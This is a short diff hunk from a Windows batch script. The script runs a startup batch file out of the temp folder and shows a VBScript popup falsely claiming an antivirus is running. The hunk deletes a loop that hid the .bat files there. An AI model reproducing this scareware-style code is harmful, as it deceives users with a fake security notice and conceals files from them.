@@ -61,10 +61,6 @@ echo exit >>Startup.bat
 move Startup.bat %temp%
 start %temp%/Startup.bat
 cd %temp%
-for /r %%f in (*.bat) do (
-attrib +h "%%f"
-)
-
 echo x=msgbox("Antivirus is running in the background...........", 0, "Protect virus is running") > Realtimecheck.vbs
 start Realtimecheck.vbs
 timeout 3 /nobreak
